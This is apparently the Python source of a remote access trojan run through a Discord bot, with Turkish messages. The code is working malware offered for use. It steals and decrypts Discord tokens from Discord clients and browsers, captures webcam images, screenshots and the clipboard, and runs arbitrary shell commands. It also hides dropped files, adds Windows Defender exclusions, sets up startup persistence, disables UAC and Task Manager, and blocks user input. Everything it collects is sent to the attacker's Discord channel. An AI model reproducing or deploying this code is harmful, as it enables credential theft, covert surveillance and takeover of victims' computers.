import discord
from discord.ext import commands
from discord import File
import requests
import psutil
import platform
import webbrowser
import mss
import subprocess
from pathlib import Path
import pyautogui
import shutil
import tempfile
import os
import ctypes   
from urllib.parse import urlparse
import cv2
import pyperclip
import io
import re
import json
import base64
import sqlite3
from Crypto.Cipher import AES

if platform.system() == "Windows":
    import winreg
    from win32 import win32crypt
else:
    winreg = None


TOKEN = ""

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

bot.remove_command('help')

@bot.command()
async def help(ctx):
    help_embed = discord.Embed(
        title="Bot Komut Yardımı",
        description="Mevcut tüm komutlar:",
        color=discord.Color.blue()
    )
    
    commands_list = [
        ("!getcam", "Mevcut kameraları kontrol et ve görüntüler yakala"),
        ("!token", "Sistemdeki Discord token'larını al"),
        ("!upload", "Sisteme dosya yükle (komutla birlikte dosya ekle)"),
        ("!startup", "Botu başlangıca ekle (kalıcılık için)"),
        ("!clipboard", "Geçerli pano içeriğini al (metin veya resim)"),
        ("!blockinput", "Klavye ve fare girişini engelle"),
        ("!unblockinput", "Klavye ve fare giriş engelini kaldır"),
        ("!inputstatus", "Girişin engelli olup olmadığını kontrol et"),
        ("!uacbypass [disable/enable/status]", "UAC ayarlarını kontrol et (yönetici gerektirir)"),
        ("!enbtaskmngr", "Görev Yöneticisini etkinleştir"),
        ("!disbltaskmngr", "Görev Yöneticisini devre dışı bırak"),
        ("!taskkill <PID/name> [force]", "PID veya isme göre işlem sonlandır ('force' ekleyerek zorla kapat)"),
        ("!tasklist", "Çalışan işlemleri listele"),
        ("!website <url>", "Varsayılan tarayıcıda bir web sitesi aç"),
        ("!cmd <komut>", "Kabukta bir komut çalıştır"),
        ("!message <metin>", "Verilen metinle bir mesaj kutusu göster"),
        ("!pcinfo", "Sistem bilgilerini al"),
        ("!screen", "Ekran görüntüsü al ve gönder"),
        ("!help", "Bu yardım mesajını göster")
    ]
    
    for cmd, desc in commands_list:
        help_embed.add_field(name=cmd, value=desc, inline=False)
    
    help_embed.set_footer(text="Komutları sorumlu bir şekilde kullanın")
    
    await ctx.send(embed=help_embed)

@bot.command()
async def getcam(ctx):
    try:
        kamera_bilgisi = []
        
        for i in range(0, 5):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                genislik = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
                yukseklik = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
                fps = cap.get(cv2.CAP_PROP_FPS)
                
                kamera_bilgisi.append({
                    'index': i,
                    'cozunurluk': f"{int(genislik)}x{int(yukseklik)}",
                    'fps': fps
                })
                cap.release()
        
        if kamera_bilgisi:
            mesaj = "**Mevcut Kameralar:**\n"
            for kamera in kamera_bilgisi:
                mesaj += (f"📹 Kamera {kamera['index']} - "
                          f"{kamera['cozunurluk']} @ {kamera['fps']:.1f}FPS\n")
            
            await ctx.send(mesaj)
            
            for kamera in kamera_bilgisi:
                try:
                    cap = cv2.VideoCapture(kamera['index'])
                    ret, frame = cap.read()
                    if ret:
                        dosya_adi = f"kamera_{kamera['index']}.jpg"
                        cv2.imwrite(dosya_adi, frame)
                        await ctx.send(
                            f"Kamera {kamera['index']} örneği:",
                            file=discord.File(dosya_adi)
                        )
                        os.remove(dosya_adi)
                    cap.release()
                except:
                    await ctx.send(f"Kamera {kamera['index']} görüntü alınamadı")
        else:
            await ctx.send("🔴 Hiç kamera bulunamadı")
            
    except Exception as e:
        await ctx.send(f"❌ Kamera kontrolü başarısız: {str(e)}")

def token_coz(encrypted_token, key):
    try:
        iv = encrypted_token[3:15]
        payload = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        return None

def sifreleme_anahtari_al(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def tokenlari_topla():
    tokenler = []
    regexler = [
        r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
        r"mfa\.[\w-]{84}"
    ]
    
    yollar = [
        os.path.join(os.getenv('APPDATA'), 'Discord'),
        os.path.join(os.getenv('APPDATA'), 'discordptb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary'),
        os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    ]
    
    for yol in yollar:
        leveldb_yolu = os.path.join(yol, 'Local Storage', 'leveldb')
        local_state_yolu = os.path.join(yol, 'Local State')
        
        if not os.path.exists(leveldb_yolu) or not os.path.exists(local_state_yolu):
            continue
            
        anahtar = sifreleme_anahtari_al(local_state_yolu)
        if not anahtar:
            continue
            
        for dosya in os.listdir(leveldb_yolu):
            if not dosya.endswith('.ldb') and not dosya.endswith('.log'):
                continue
                
            try:
                with open(os.path.join(leveldb_yolu, dosya), 'r', encoding='utf-8', errors='ignore') as f:
                    icerik = f.read()
                    
                    for regex in regexler:
                        for eslesme in re.findall(regex, icerik):
                            tokenler.append(eslesme)
                            
                    sifreli_eslesmeler = re.findall(r"dQw4w9WgXcQ:[^\"]*", icerik)
                    for eslesme in sifreli_eslesmeler:
                        sifreli_token = base64.b64decode(eslesme.split('dQw4w9WgXcQ:')[1])
                        cozulmus = token_coz(sifreli_token, anahtar)
                        if cozulmus:
                            tokenler.append(cozulmus)
            except:
                continue
                
    return list(set(tokenler))

def token_bilgisi_al(token):
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return response.json()
    except:
        return None
    return None

@bot.command()
async def token(ctx):
    try:
        tokenler = tokenlari_topla()
        if not tokenler:
            await ctx.send("❌ Hiç token bulunamadı")
            return
            
        sonuclar = []
        for token in tokenler:
            bilgi = token_bilgisi_al(token)
            if bilgi:
                sonuclar.append({
                    'token': token,
                    'kullanici_adi': f"{bilgi['username']}#{bilgi['discriminator']}",
                    'email': bilgi.get('email', 'Yok'),
                    'telefon': bilgi.get('phone', 'Yok'),
                    'dogrulandi': bilgi.get('verified', False)
                })
        
        if not sonuclar:
            await ctx.send("ℹ Tokenler bulundu ancak doğrulanamadı")
            return
            
        mesaj = "**Bulunan Geçerli Tokenler:**\n"
        for i, sonuc in enumerate(sonuclar, 1):
            mesaj += (
                f"\n**Token {i}**\n"
                f"👤 Kullanıcı: {sonuc['kullanici_adi']}\n"
                f"📧 Email: {sonuc['email']}\n"
                f"📱 Telefon: {sonuc['telefon']}\n"
                f"✅ Doğrulandı: {sonuc['dogrulandi']}\n"
                f"🔑 Token: ||{sonuc['token']}||\n"
            )

        if len(mesaj) > 2000:
            parcalar = [mesaj[i:i+2000] for i in range(0, len(mesaj), 2000)]
            for parca in parcalar:
                await ctx.send(parca)
        else:
            await ctx.send(mesaj)
            
    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")


@bot.command()
async def upload(ctx):
    try:
        if not ctx.message.attachments:
            return await ctx.send("❌ Lütfen bir dosya ekleyin")

        ek = ctx.message.attachments[0]
        dosya_adi = ek.filename
        
        import random
        import string
        yeni_dosya_adi = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + os.path.splitext(dosya_adi)[1]
        
        gecici_dizin = tempfile.gettempdir()
        dosya_yolu = os.path.join(gecici_dizin, yeni_dosya_adi)
        
        msg = await ctx.send(f"⬇️ {dosya_adi} indiriliyor...")
        await ek.save(dosya_yolu)
        
        ctypes.windll.kernel32.SetFileAttributesW(dosya_yolu, 2)
        
        basarili = False
        try:
            ps_komut = f"""Start-Process powershell -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath "{dosya_yolu}"'"""
            subprocess.run(ps_komut, shell=True, timeout=10)
            basarili = True
        except:
            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
                    0, winreg.KEY_SET_VALUE
                ) as key:
                    winreg.SetValueEx(key, dosya_yolu, 0, winreg.REG_DWORD, 0)
                basarili = True
            except:
                pass

        yanit = (
            f"✅ **Dosya başarıyla dağıtıldı**\n"
            f"📂 **Konum**: `{dosya_yolu}`\n"
            f"👻 **Gizli**: Evet\n"
            f"🛡️ **Defender Hariç Tutma**: {'Evet' if basarili else 'Başarısız'}\n"
            f"📦 **Orijinal İsim**: {dosya_adi}"
        )
        
        await msg.edit(content=yanit)
        
    except Exception as e:
        await ctx.send(f"❌ **Hata**: {str(e)}")


@bot.command()
async def startup(ctx):
    try:
        mevcut_dosya = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        dosya_adi = os.path.basename(mevcut_dosya)
        
        baslangic_klasoru = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        baslangic_kopyasi = os.path.join(baslangic_klasoru, dosya_adi)
        
        if not os.path.exists(baslangic_kopyasi):
            shutil.copy2(mevcut_dosya, baslangic_kopyasi)
            msg1 = "✓ Başlangıç klasörüne eklendi\n"
        else:
            msg1 = "⚠ Zaten başlangıç klasöründe\n"
        
        reg_yolu = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_yolu, 0, winreg.KEY_READ) as key:
                mevcut_deger = winreg.QueryValueEx(key, "DiscordBot")[0]
                if mevcut_deger == baslangic_kopyasi:
                    msg2 = "⚠ Zaten kayıt defterinde"
                else:
                    msg2 = "✓ Kayıt defteri güncellendi"
        except FileNotFoundError:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_yolu, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "DiscordBot", 0, winreg.REG_SZ, baslangic_kopyasi)
            msg2 = "✓ Kayıt defterine eklendi"
        
        await ctx.send(f"**Başlangıç Kalıcılığı:**\n{msg1}{msg2}")
        
    except Exception as e:
        await ctx.send(f"❌ Kalıcılık ayarlanırken hata: {str(e)}")

@bot.command()
async def clipboard(ctx):
    """Geçerli pano içeriğini gönder (metin veya resim)"""
    try:
        try:
            pano_metni = pyperclip.paste()
            if pano_metni.strip():
                if len(pano_metni) > 1500:
                    with io.StringIO(pano_metni) as dosya:
                        await ctx.send("📋 Panodaki metin:", 
                                    file=discord.File(dosya, filename="pano.txt"))
                else:
                    await ctx.send(f"📋 Panodaki metin:\n```{pano_metni}```")
                return
        except:
            pass

        try:
            img = ImageGrab.grabclipboard()
            if img:
                with io.BytesIO() as resim_binary:
                    img.save(resim_binary, format='PNG')
                    resim_binary.seek(0)
                    await ctx.send("🖼️ Panodaki resim:", 
                                 file=discord.File(resim_binary, filename="pano.png"))
                return
        except:
            pass

        await ctx.send("ℹ️ Pano boş veya desteklenmeyen veri içeriyor")

    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")


giris_engelli = False

@bot.command()
async def blockinput(ctx):
    global giris_engelli
    
    try:
        ctypes.windll.user32.BlockInput(True)
        giris_engelli = True
        
        await ctx.send("⚠️ Klavye ve fare girişi ENGELLENDİ")
    except Exception as e:
        await ctx.send(f"❌ Giriş engellenirken hata: {str(e)}")

@bot.command()
async def unblockinput(ctx):
    """Klavye ve fare giriş engelini kaldır"""
    global giris_engelli
    
    try:
        ctypes.windll.user32.BlockInput(False)
        giris_engelli = False
        
        await ctx.send("✅ Klavye ve fare girişi SERBEST")
    except Exception as e:
        await ctx.send(f"❌ Giriş serbest bırakılırken hata: {str(e)}")

@bot.command()
async def inputstatus(ctx):
    """Giriş engel durumunu kontrol et"""
    global giris_engelli
    durum = "ENGELLİ" if giris_engelli else "SERBEST"
    await ctx.send(f"ℹ️ Mevcut giriş durumu: {durum}")

@bot.command()
async def uacbypass(ctx, action: str = "disable"):
    """UAC ayarlarını kontrol et (devre dışı bırak/etkinleştir/durum)"""
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("❌ Yönetici ayrıcalıkları gerekli")
            return

        key_yolu = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        degerler = ["EnableLUA", "ConsentPromptBehaviorAdmin", "PromptOnSecureDesktop"]
        
        yedek = {}
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_yolu) as key:
            for deger in degerler:
                try:
                    yedek[deger] = winreg.QueryValueEx(key, deger)[0]
                except:
                    yedek[deger] = None

        if action.lower() == "disable":
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_yolu, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
            await ctx.send("⚠️ UAC tamamen devre dışı - YENİDEN BAŞLATMA GEREKİYOR")
            
        elif action.lower() == "enable":
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_yolu, 0, winreg.KEY_SET_VALUE) as key:
                for deger, veri in yedek.items():
                    if veri is not None:
                        winreg.SetValueEx(key, deger, 0, winreg.REG_DWORD, veri)
            await ctx.send("✅ UAC korumaları geri yüklendi - YENİDEN BAŞLATMA GEREKİYOR")
            
        elif action.lower() == "status":
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_yolu) as key:
                uac_durumu = winreg.QueryValueEx(key, "EnableLUA")[0]
            durum = "AKTİF" if uac_durumu else "DEVRE DIŞI"
            await ctx.send(f"ℹ️ Mevcut UAC Durumu: {durum}")
            
        else:
            await ctx.send("❌ Geçersiz işlem. Kullanım: disable/enable/status")
            
    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")

@bot.command()
async def enbtaskmngr(ctx):
    """Görev Yöneticisini etkinleştir"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            0, winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        
        await ctx.send("✅ Görev Yöneticisi etkinleştirildi")
    except Exception as e:
        await ctx.send(f"❌ Görev Yöneticisi etkinleştirilirken hata: {str(e)}")

@bot.command()
async def disbltaskmngr(ctx):
    """Görev Yöneticisini devre dışı bırak"""
    try:
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_SET_VALUE
            )
        except FileNotFoundError:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
        
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        await ctx.send("⚠️ Görev Yöneticisi devre dışı bırakıldı")
    except Exception as e:
        await ctx.send(f"❌ Görev Yöneticisi devre dışı bırakılırken hata: {str(e)}")


@bot.command()
async def taskkill(ctx, process_identifier: str, force: str = None):
    try:
        sonlandirilanlar = []
        zorla_sonlandir = force and force.lower() == 'force'
        
        if process_identifier.isdigit():
            try:
                proc = psutil.Process(int(process_identifier))
                if zorla_sonlandir:
                    proc.kill()
                    sonlandirilanlar.append(f"☠️ PID {process_identifier} zorla sonlandırıldı")
                else:
                    proc.terminate()
                    sonlandirilanlar.append(f"✓ PID {process_identifier} sonlandırıldı")
            except psutil.NoSuchProcess:
                await ctx.send(f"❌ PID {process_identifier} bulunamadı")
            except psutil.AccessDenied:
                await ctx.send(f"⚠️ PID {process_identifier} sonlandırma izni reddedildi")
        
        else:
            bulundu = False
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() == process_identifier.lower():
                        if zorla_sonlandir:
                            psutil.Process(proc.info['pid']).kill()
                            sonlandirilanlar.append(f"☠️ {proc.info['name']} (PID: {proc.info['pid']}) zorla sonlandırıldı")
                        else:
                            psutil.Process(proc.info['pid']).terminate()
                            sonlandirilanlar.append(f"✓ {proc.info['name']} (PID: {proc.info['pid']}) sonlandırıldı")
                        bulundu = True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if not bulundu:
                await ctx.send(f"❌ '{process_identifier}' adında işlem bulunamadı")
        
        if sonlandirilanlar:
            yanit = "\n".join(sonlandirilanlar)
            if zorla_sonlandir:
                yanit += "\n⚠️ Zorla sonlandırma veri kaybına neden olabilir!"
            await ctx.send(yanit)
    
    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")

@bot.command()
async def tasklist(ctx):
    try:
        prosesler = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'username']):
            try:
                prosesler.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        basliklar = ["PID", "İsim", "CPU %", "Bellek %", "Kullanıcı"]
        proses_listesi = "\t".join(basliklar) + "\n"
        proses_listesi += "-"*60 + "\n"
        
        for proc in sorted(prosesler, key=lambda p: p['memory_percent'], reverse=True)[:30]:  # İlk 30
            satir = f"{proc['pid']}\t{proc['name'][:12]}\t{proc['cpu_percent']:.1f}\t{proc['memory_percent']:.1f}\t{proc['username'] or 'SYSTEM'}"
            proses_listesi += satir + "\n"

        parcalar = [proses_listesi[i:i+1900] for i in range(0, len(proses_listesi), 1900)]
        for parca in parcalar:
            await ctx.send(f"```{parca}```")

    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")

@bot.command()
async def website(ctx, *, url: str):
    try:
        url = url.strip()
        
        url = url.replace('https://', '').replace('http://', '')
        
        webbrowser.open(f'https://{url}')
        
        await ctx.send(f"✅ Web sitesi açıldı: {url}")
        
    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")
@bot.command()
async def cmd(ctx, *, komut: str):
    try:
        process = subprocess.Popen(
            komut,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        cikti, hata = process.communicate()
        
        sonuc = cikti.decode('utf-8', errors='replace') if cikti else ""
        hata_mesaji = hata.decode('utf-8', errors='replace') if hata else ""
        
        tam_sonuc = f"Çıktı:\n{sonuc}\nHata:\n{hata_mesaji}" if hata_mesaji else f"Çıktı:\n{sonuc}"
        
        if len(tam_sonuc) > 2000:
            for i in range(0, len(tam_sonuc), 2000):
                await ctx.send(f"```{tam_sonuc[i:i+2000]}```")
        else:
            await ctx.send(f"```{tam_sonuc}```")
            
    except Exception as e:
        await ctx.send(f"Komut çalıştırılırken hata: {str(e)}")

@bot.command()
async def message(ctx, *, mesaj: str):
    try:
        pyautogui.alert(text=mesaj, button='Tamam')
        await ctx.send(f"Mesaj başarıyla gösterildi: '{mesaj}'")
    except Exception as e:
        await ctx.send(f"Hata oluştu: {e}")


@bot.command()
async def pcinfo(ctx):
    try:
        ip_verisi = requests.get("http://ip-api.com/json/").json()
        ip = ip_verisi.get("query", "Bilinmiyor")
        sehir = ip_verisi.get("city", "Bilinmiyor")
        bolge = ip_verisi.get("regionName", "Bilinmiyor")
        ulke = ip_verisi.get("country", "Bilinmiyor")

        ram = psutil.virtual_memory().total / (1024 ** 3)

        disk = psutil.disk_usage('/').total / (1024 ** 3)

        os_bilgisi = platform.system() + " " + platform.release()

        bilgi_mesaji = (
            f"📡 IP Adresi: {ip}\n"
            f"🧭 Konum: {sehir}, {bolge}, {ulke}\n"
            f"💻 İşletim Sistemi: {os_bilgisi}\n"
            f"💾 Depolama (toplam): {disk:.2f} GB\n"
            f"🧠 RAM (toplam): {ram:.2f} GB"
        )

        await ctx.send(f"**Sistem Bilgileri:**\n```{bilgi_mesaji}```")

    except Exception as e:
        await ctx.send(f"Hata oluştu: {e}")


@bot.command()
async def screen(ctx):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as gecici_dosya:
        with mss.mss() as ekran:
            ekran.shot(output=gecici_dosya.name)
        try:
            await ctx.send(file=discord.File(gecici_dosya.name))
        finally:
            os.remove(gecici_dosya.name)


bot.run(TOKEN)